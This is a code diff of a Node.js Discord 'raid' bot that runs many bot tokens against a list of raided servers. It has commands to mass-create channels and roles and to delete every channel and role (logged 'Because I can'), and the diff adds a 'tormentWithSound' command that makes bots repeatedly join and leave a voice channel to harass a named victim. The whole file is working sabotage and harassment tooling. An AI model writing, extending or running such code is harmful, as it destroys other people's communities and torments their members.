@@ -3,12 +3,19 @@ process.stdout.write('\x1Bc')
 let connectedBots = [];
 
 // Variables
+const raidDir = './raidData'
+const genDir = './genData'
+
 const { Client, Intents } = require('discord.js');
-const dotaShit = require('./dotaShit.json')
-const animeShit = require('./animeShit.json')
-const TOKENS = require('./TOKENS.json')
-const BOTS = require('./BOTS.json')
-const GUILDS = require('./RAIDED_GUILDS.json')
+const { joinVoiceChannel } = require('@discordjs/voice');
+
+const dotaShit = require(`${genDir}/dotaShit.json`)
+const animeShit = require(`${genDir}/animeShit.json`)
+
+const TOKENS = require(`${raidDir}/TOKENS.json`)
+const BOTS = require(`${raidDir}/BOTS.json`)
+const GUILDS = require(`${raidDir}/RAIDED_GUILDS.json`)
+
 const utils = require('./utils.js');
 
 // [start] Input handler
@@ -21,7 +28,8 @@ Prompt.setCompletion(
         'createChannels',
         'createRoles',
         'deleteChannels',
-        'deleteRoles'
+        'deleteRoles',
+        'tormentWithSound'
     ])
 
 let lastCommand = ''
@@ -34,11 +42,12 @@ Prompt.on('line', (line) => {
                 'createChannels amount:int\n' +
                 'createRoles amount:int\n' +
                 'deleteChannels\n' +
-                'deleteRoles'
+                'deleteRoles\n' +
+                'tormentWithSound id:int'
             )
         default:
             const lineFirstWord = line.split(' ')[0]
-            
+
             if (!(lineFirstWord in connectedBots[0])) {
                 console.warn(`Undefined option: ${lineFirstWord}, type help for more info`)
                 break
@@ -76,13 +85,14 @@ function launch(token, delay) {
                 const options = message.split(' ')
                 const guild = client.guilds.cache.get(GUILDS[0])
 
+
                 return { options, guild }
             }
             else {
                 const options = message.content.split(' ')
                 const channel = client.channels.cache.get(message.channelId)
                 const guild = client.guilds.cache.get(message.guildId)
-                
+
                 return { options, guild }
             }
         },
@@ -153,7 +163,7 @@ function launch(token, delay) {
             const base = command.options(message);
 
             for (let role of base.guild.roles.cache) {
-                setTimeout(() => { 
+                setTimeout(() => {
 
                     role[1].delete('Because I can')
                         .then(role => {
@@ -167,6 +177,22 @@ function launch(token, delay) {
                 }, delay / 3
                 )
             }
+        },
+        'tormentWithSound': (message) => {
+            const base = command.options(message)
+            const victim = base.options[1]
+
+            const channel = base.guild.channels.cache.get("723290894391967848")
+
+            setInterval(() => {
+                let connection = joinVoiceChannel({
+                    channelId: channel.id,
+                    guildId: channel.guild.id,
+                    adapterCreator: channel.guild.voiceAdapterCreator,
+                })
+
+                connection.destroy()
+            }, delay / 10)
         }
     }
 
